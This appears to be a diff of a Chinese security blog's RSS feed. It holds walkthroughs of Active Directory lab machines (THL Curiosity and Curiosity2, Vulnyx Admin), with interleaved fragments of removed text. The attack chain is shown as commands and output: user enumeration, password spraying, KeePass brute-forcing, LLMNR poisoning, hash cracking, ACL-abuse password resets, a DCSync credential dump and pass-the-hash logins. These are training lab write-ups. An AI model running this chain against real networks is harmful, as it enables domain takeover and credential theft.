+          2 user_47F7501A                                      64409A1C!@1
+          3 user_515A0C58                                      CAD616E3!@1
+          4 user_CA843BF2                                      731C60AD!@1
+          5 user_AA2B9FF8                                      8E181E5F!@1
+          6 user_F6E6A108                                      47862562!@1
+          7 user_8D56BAE8                                      425B6335!@1
+          8 user_BA9B1295                                      E4FC1AC4!@1
+          9 user_66B7DBEE                                      4EE216A3!@1
+         10 user_E75B7C23                                      4CD89A92!@1
+
+(10 rows affected)
+
+<br><br>将这些密码存在一个文件里面作为字典<br>
+然后使用rpcclient获取域内所有的用户<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# rpcclient -U "Appolonia%5umm3r@" 192.168.56.116 -c 'enumdomusers'|cut -d '[' -f2|cut -d ']' -f1 &gt;dbuser.txt
+<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# crackmapexec smb cons.thl -u dbuser.txt  -p userdb_pass --continue-on-success
+SMB         cons.thl        445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:433129A1!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:64409A1C!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:CAD616E3!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:731C60AD!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:8E181E5F!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:47862562!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:425B6335!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:E4FC1AC4!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:4EE216A3!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:4CD89A92!@1 STATUS_LOGON_FAILURE
+SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Guest:433129A1!@1 STATUS_LOGON_FAILURE
+
+...
+<br>全部失败了<br>可能这个密码不是这些用户的<br><br>有可能是我们之前获取的kdbx文件数据库的密码<br>
+利用工具进行爆破<br>
+<a rel="noopener nofollow" class="external-link" href="https://github.com/r3nt0n/keepass4brute" target="_blank">https://github.com/r3nt0n/keepass4brute</a><br>
+需要先安装前置环境<br>add-apt-repository -y ppa:phoerious/keepassxc
+apt update &amp;&amp; sudo apt install keepassxc
+<br>爆破密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# ./keepass4brute.sh Database.kdbx userdb_pass
+keepass4brute 1.3 by r3nt0n
+https://github.com/r3nt0n/keepass4brute
+
+[+] Words tested: 5/9 - Attempts per minute: 0 - Estimated time remaining: Calculating...
+[+] Current attempt: 8E181E5F!@1
+
+[*] Password found: 8E181E5F!@1
+
+<br>成功获取到数据库的密码 8E181E5F!@1<br>查看数据库文件内容<br>
+<img alt="Pasted image 20241216181212" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216181212.png" referrerpolicy="no-referrer"><br>
+可以发现有 MSOL 用户的密码 YRax2Ry8g2ITQ3hpRPze<br><br>分析 MSOL 用户，发现可以执行DCSync攻击<br>
+<img alt="Pasted image 20241216181401" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216181401.png" referrerpolicy="no-referrer"><br>┌──(root㉿kali)-[/home/…/thl/curiosity2/impacket-master/impacket]
+└─# impacket-secretsdump MSOL:'YRax2Ry8g2ITQ3hpRPze'@WIN-C73PROQLRHL.cons.thl
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a6c4014f622dcadd4ec24cec540aaa86:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+cons.thl\sqlsvc:1104:aad3b435b51404eeaad3b435b51404ee:17e75629f370f459434786808006cac1:::
+cons.thl\jwats:1105:aad3b435b51404eeaad3b435b51404ee:197c3e98518a436666dbe95d78dc87a6:::
+
+...
+<br>pth上去获取flag<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
+└─# evil-winrm -i 192.168.56.116 -u Administrator -H '5d48bcf84aea999fb1ade06970a81237'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+cons\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type root.flag.txt
+372a1c39714b6bbcec0f85de5c6c2599
+
+*Evil-WinRM* PS C:\Users\appolonia\documents&gt; type user.flag.txt
+de4769769d10f96ae069e9926a10454e
+
+]]></description><link>https://www.c1trus.top/24-渗透/thl/6.curiosity2.html</link><guid isPermaLink="false">24-渗透/THL/6.curiosity2.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.curiosity]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+
+<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
+<br><a data-tooltip-position="top" aria-label="2.2. smb空会话检测" data-href="#2.2. smb空会话检测" href="https://www.c1trus.top/about:blank#2.2._smb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">2.2. smb空会话检测</a>
+<br><a data-tooltip-position="top" aria-label="2.3. kerbrute爆破域内用户" data-href="#2.3. kerbrute爆破域内用户" href="https://www.c1trus.top/about:blank#2.3._kerbrute爆破域内用户" class="internal-link" target="_self" rel="noopener nofollow">2.3. kerbrute爆破域内用户</a>
+<br><a data-tooltip-position="top" aria-label="2.4. NTML中毒攻击" data-href="#2.4. NTML中毒攻击" href="https://www.c1trus.top/about:blank#2.4._NTML中毒攻击" class="internal-link" target="_self" rel="noopener nofollow">2.4. NTML中毒攻击</a>
+<br><a data-tooltip-position="top" aria-label="2.5. winrm连接" data-href="#2.5. winrm连接" href="https://www.c1trus.top/about:blank#2.5._winrm连接" class="internal-link" target="_self" rel="noopener nofollow">2.5. winrm连接</a>
+
+
+<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a>
+
+<br><a data-tooltip-position="top" aria-label="3.1. bloodhound分析域内环境" data-href="#3.1. bloodhound分析域内环境" href="https://www.c1trus.top/about:blank#3.1._bloodhound分析域内环境" class="internal-link" target="_self" rel="noopener nofollow">3.1. bloodhound分析域内环境</a>
+<br><a data-tooltip-position="top" aria-label="3.2. 修改 DBA_ADM 用户密码" data-href="#3.2. 修改 DBA_ADM 用户密码" href="https://www.c1trus.top/about:blank#3.2._修改_DBA_ADM_用户密码" class="internal-link" target="_self" rel="noopener nofollow">3.2. 修改 DBA_ADM 用户密码</a>
+<br><a data-tooltip-position="top" aria-label="3.3. sqlcmd获取数据库内容" data-href="#3.3. sqlcmd获取数据库内容" href="https://www.c1trus.top/about:blank#3.3._sqlcmd获取数据库内容" class="internal-link" target="_self" rel="noopener nofollow">3.3. sqlcmd获取数据库内容</a>
+<br><a data-tooltip-position="top" aria-label="3.4. 解密hash" data-href="#3.4. 解密hash" href="https://www.c1trus.top/about:blank#3.4._解密hash" class="internal-link" target="_self" rel="noopener nofollow">3.4. 解密hash</a>
+<br><a data-tooltip-position="top" aria-label="3.5. 分析SQLSVC用户权限" data-href="#3.5. 分析SQLSVC用户权限" href="https://www.c1trus.top/about:blank#3.5._分析SQLSVC用户权限" class="internal-link" target="_self" rel="noopener nofollow">3.5. 分析SQLSVC用户权限</a>
+
+
+<br><a data-tooltip-position="top" aria-label="4. 约束性委派" data-href="#4. 约束性委派" href="https://www.c1trus.top/about:blank#4._约束性委派" class="internal-link" target="_self" rel="noopener nofollow">4. 约束性委派</a><br>
+- <a data-tooltip-position="top" aria-label="4.1. 在分析机器GMSA_SVC$的权限" data-href="#4.1. 在分析机器GMSA_SVC$的权限" href="https://www.c1trus.top/about:blank#4.1._在分析机器GMSA_SVC$的权限" class="internal-link" target="_self" rel="noopener nofollow">4.1. 在分析机器GMSA_SVC$的权限</a><br>
+靶机链接<br>
+难度 ⭐️⭐️⭐️⭐️⭐️
+<br><br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# fscan -h 192.168.56.8
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+192.168.56.8:88 open
+192.168.56.8:135 open
+192.168.56.8:139 open
+192.168.56.8:445 open
+[*] alive ports len is: 4
+start vulscan
+[*] NetInfo
+[*]192.168.56.8
+   [-&gt;]DC
+   [-&gt;]192.168.56.8
+   [-&gt;]10.16.82.189
+   [-&gt;]2409:8760:1e81:10::2:8e3e
+   [-&gt;]2001:0:348b:fb58:49f:3950:f5ef:ad42
+[*] NetBios 192.168.56.8    [+] DC:HACKME\DC
+已完成 4/4
+[*] 扫描结束,耗时: 2.061390421s
+
+┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# nmap -sCV 192.168.56.8
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 19:23 CST
+Nmap scan report for 192.168.56.8
+Host is up (0.00014s latency).
+Not shown: 989 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-09 17:23:07Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.hackme.thl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
+| Not valid before: 2024-10-16T13:11:58
+|_Not valid after:  2025-10-16T13:11:58
+|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
+| ssl-cert: Subject: commonName=DC.hackme.thl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
+| Not valid before: 2024-10-16T13:11:58
+|_Not valid after:  2025-10-16T13:11:58
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
+| ssl-cert: Subject: commonName=DC.hackme.thl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
+| Not valid before: 2024-10-16T13:11:58
+|_Not valid after:  2025-10-16T13:11:58
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
+| ssl-cert: Subject: commonName=DC.hackme.thl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
+| Not valid before: 2024-10-16T13:11:58
+|_Not valid after:  2025-10-16T13:11:58
+MAC Address: 08:00:27:4A:93:90 (Oracle VirtualBox virtual NIC)
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2024-12-09T17:23:46
+|_  start_date: 2024-12-09T17:19:49
+|_clock-skew: mean: 5h59m57s, deviation: 0s, median: 5h59m57s
+|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:4a:93:90 (Oracle VirtualBox virtual NIC)
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.26 seconds
+
+<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# smbmap -u anonymous -H 192.168.56.8
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -174,135 +931,1674 @@ By hope
     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
------------------------------------------------------------------------------
-SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                      https://github.com/ShawnDEvans/smbmap
 
-[\] Checking for open ports...                                                                         [*] Detected 1 hosts serving SMB
-[|] Initializing hosts...                                                                              [/] Authenticating...                                                                                  [-] Authenticating...                                                                                  [\] Authenticating...                                                                                  [*] Established 1 SMB connections(s) and 0 authenticated session(s)
-[|] Closing connections..                                                                              [/] Closing connections..                                                                              [-] Closing connections..                                                                              [*] Closed 1 connections
+[*] Detected 1 hosts serving SMB
+[*] Established 0 SMB session(s)
 
-<br>看来不存在<br><br>既然获取到了用户名<br>
-那么可以尝试进行爆破<br>┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
-└─# crackmapexec smb 192.168.56.20 -u 'hope' -p 'loser'
-SMB         192.168.56.20   445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:False)
-SMB         192.168.56.20   445    ADMIN            [-] ADMIN\hope:loser STATUS_ACCOUNT_LOCKED_OUT
+<br>啥都没有<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# kerbrute userenum -d hackme.thl --dc dc.hackme.thl  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 
-<br>Warning
-这里正常是可以爆破出Hope用户的密码 loser<br>
-但是我靶机可能出问题了 用这个密码登录不上去。 试了下爆破其他的密码 但是爆破不了
-<br><br>这里由于我Hope用户无法登录，所以无法完成。直接看的wp<br>
-<a rel="noopener nofollow" class="external-link" href="https://d4t4s3c.medium.com/vulnyx-admin-walkthrough-66fc5891bec0" target="_blank">https://d4t4s3c.medium.com/vulnyx-admin-walkthrough-66fc5891bec0</a><br>
-winrm上去后<br>
-利用 winpeas检测 可以获取到管理员的执行Powershell的历史记录<br>
-里面有他的账号密码<br><img alt="assets/Pasted image 20241223125754.png" src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png"><br>然后利用winrm连接去上即可<br>┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
-└─# evil-winrm -i 192.168.56.20 -u administrator -p SuperAdministrator123
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
 
-Evil-WinRM shell v3.7
+Version: v1.0.3 (9dad6e1) - 12/09/24 - Ronnie Flathers @ropnop
+
+2024/12/09 19:28:26 &gt;  Using KDC(s):
+2024/12/09 19:28:26 &gt;   dc.hackme.thl:88
+
+2024/12/09 19:28:27 &gt;  [+] VALID USERNAME:       administrator@hackme.thl
+2024/12/09 19:28:28 &gt;  [+] VALID USERNAME:       osama@hackme.thl
+2024/12/09 19:28:29 &gt;  [+] VALID USERNAME:       jdoe@hackme.thl
+2024/12/09 19:28:32 &gt;  [+] VALID USERNAME:       Administrator@hackme.thl
+2024/12/09 19:28:42 &gt;  [+] VALID USERNAME:       yogesh@hackme.thl
+2024/12/09 19:29:56 &gt;  [+] VALID USERNAME:       JDoe@hackme.thl
+2024/12/09 19:32:25 &gt;  [+] VALID USERNAME:       appolonia@hackme.thl
+2024/12/09 19:32:31 &gt;  [+] VALID USERNAME:       aaren@hackme.thl
+
+<br>将这些用户的名字提取出来 <br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# cat kerbrute_users.txt|cut -d ' ' -f14|awk -F  '@hack' '{print $1}' &gt; valid_users.txt
+
+┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# cat valid_users.txt
+administrator
+osama
+jdoe
+Administrator
+yogesh
+JDoe
+appolonia
+aaren
+
+<br>使用这些用户进行smb爆破<br>
+但是失败了<br><br>┌──(root㉿kali)-[~]
+└─# responder -I eth0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
+[SMB] NTLMv2-SSP Client   : fe80::d4db:8c8a:d91a:fba7
+[SMB] NTLMv2-SSP Username : hackme\jdoe
+[SMB] NTLMv2-SSP Hash     : jdoe::hackme:a80ce2dc6617f684:E158321071759A3992DD284245EE2CAE:010100000000000000D712DE744ADB015540EDBF22DC66B3000000000200080056005A004400370001001E00570049004E002D004D00350031004200300047004100480047004D00350004003400570049004E002D004D00350031004200300047004100480047004D0035002E0056005A00440037002E004C004F00430041004C000300140056005A00440037002E004C004F00430041004C000500140056005A00440037002E004C004F00430041004C000700080000D712DE744ADB010600040002000000080030003000000000000000000000000040000086022E48DD6F8D2AB918C5A1878B26B5CABA662847271EF44BE523D72A543E120A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
+[+] Exiting...
+
+<br>爆破hash<br>hashcat -a 0 -m 5600 ntlmv2.txt /usr/share/wordlists/seclists/Passwords/seasons.txt
+
+JDOE::hackme:a80ce2dc6617f684:e158321071759a3992dd284245ee2cae:010100000000000000d712de744adb015540edbf22dc66b3000000000200080056005a004400370001001e00570049004e002d004d00350031004200300047004100480047004d00350004003400570049004e002d004d00350031004200300047004100480047004d0035002e0056005a00440037002e004c004f00430041004c000300140056005a00440037002e004c004f00430041004c000500140056005a00440037002e004c004f00430041004c000700080000d712de744adb010600040002000000080030003000000000000000000000000040000086022e48dd6f8d2ab918c5a1878b26b5caba662847271ef44be523d72a543e120a0010000000000000000000000000000000000009001c0063006900660073002f00530051004c00730065007200760065007200000000000000000000000000:$pr1ng@
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: JDOE::hackme:a80ce2dc6617f684:e158321071759a3992dd2...000000
+Time.Started.....: Mon Dec  9 20:12:40 2024 (0 secs)
+Time.Estimated...: Mon Dec  9 20:12:40 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1879.6 kH/s (0.85ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4096/5390 (75.99%)
+Rejected.........: 0/4096 (0.00%)
+Restore.Point....: 0/5390 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
+Hardware.Mon.#1..: Util: 15%
+
+<br>成功获取密码 $pr1ng@<br><br>利用winrm连接上来-<br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# evil-winrm -i 192.168.56.8 -u JDOE -p '$pr1ng@'
+
+Evil-WinRM shell v3.5
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\administrator\Documents&gt; whoami
-admin\administrator
-*Evil-WinRM* PS C:\Users\administrator\Documents&gt;
+*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; whoami /priv
 
-]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/3.admin.html</link><guid isPermaLink="false">24-渗透/Vulnyx/3.Admin.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Eternal]]></title><description><![CDATA[ 
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+<br>看了一下权限 没有啥可以直接利用的<br><br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# netexec ldap 192.168.56.8 -u 'jdoe' -p '$pr1ng@'  --bloodhound --collection All --dns-server 192.168.56.8
+SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
+LDAP        192.168.56.8    389    DC               [+] hackme.thl\jdoe:$pr1ng@
+LDAP        192.168.56.8    389    DC               Resolved collection methods: dcom, container, group, trusts, session, acl, rdp, objectprops, psremote, localadmin
+LDAP        192.168.56.8    389    DC               Done in 00M 11S
+LDAP        192.168.56.8    389    DC               Compressing output into /root/.nxc/logs/DC_192.168.56.8_2024-12-10_023006_bloodhound.zip
+
+<br><img alt="Pasted image 20241209212339" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" referrerpolicy="no-referrer"><br>
+<img alt="Pasted image 20241209212314" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212314.png" referrerpolicy="no-referrer"><br>
+可以发现 jdoe 用户是 IT ADMIN 组的成员，而该组的成功可以修改 DBA_ADM 用户的密码<br>
+但是 dba_adm 用户并没有特别的权限。但根据名字大概可以推断出其具有数据库管理员的权限<br><br>使用 impacket-changepasswd 修改密码<br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# impacket-changepasswd hackme.thl/'dba_adm'@192.168.56.8 -newpass 'admin!@#45' -altuser 'jdoe' -altpass '$pr1ng@' -no-pass -reset
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Setting the password of hackme.thl\dba_adm as hackme.thl\jdoe
+[*] Connecting to DCE/RPC as hackme.thl\jdoe
+[*] Password was changed successfully.
+[!] User no longer has valid AES keys for Kerberos, until they change their password again.
+
+<br>测试一下能不能winrm上去<br>┌──(root㉿kali)-[/home/kali/thl/curiosity]
+└─# evil-winrm -i 192.168.56.8 -u dba_adm -p 'admin!@#45'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt;
+<br>可以发现是存在数据库服务的<br>
+<img alt="Pasted image 20241209213951" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209213951.png" referrerpolicy="no-referrer"><br>
+获取一下数据库服务名称<br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL
+    SQLEXPRESS    REG_SZ    MSSQL15.SQLEXPRESS
+
+<br>名称是 SQLEXPRESS 但完整名称是 DC\SQLEXPRESS<br><br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S 'DC\SQLEXPRESS' -Q 'select @@version;'
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+        Sep 24 2019 13:48:23
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)
+
+
+(1 rows affected)
+
+*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S 'DC\SQLEXPRESS' -Q 'SELECT name FROM master.dbo.sysdatabases;'
+name
+--------------------------------------------------------------------------------------------------------------------------------
+master
+tempdb
+model
+msdb
+CredentialsDB
+
+(5 rows affected)
+
+
+<br>里面发现五个数据库 其中有一个十分可能有价值的数据库 CredentialsDB<br>获取里面的内容<br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S DC\SQLEXPRESS -d CredentialsDB -Q "SELECT * FROM dbo.Credentials;"
+ID          Username                                           Password
+----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
+          1 sqlsvc                                             23012244084524e51305f015727b890b
+
+(1 rows affected)
+
+<br><br>23012244084524e51305f015727b890b:P@ssword1234!
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 23012244084524e51305f015727b890b
+Time.Started.....: Mon Dec 09 21:54:01 2024 (0 secs)
+Time.Estimated...: Mon Dec 09 21:54:01 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   101.5 MH/s (1.83ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
+Speed.#2.........:        0 H/s (7.72ms) @ Accel:128 Loops:1 Thr:64 Vec:1
+Speed.#*.........:   101.5 MH/s
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
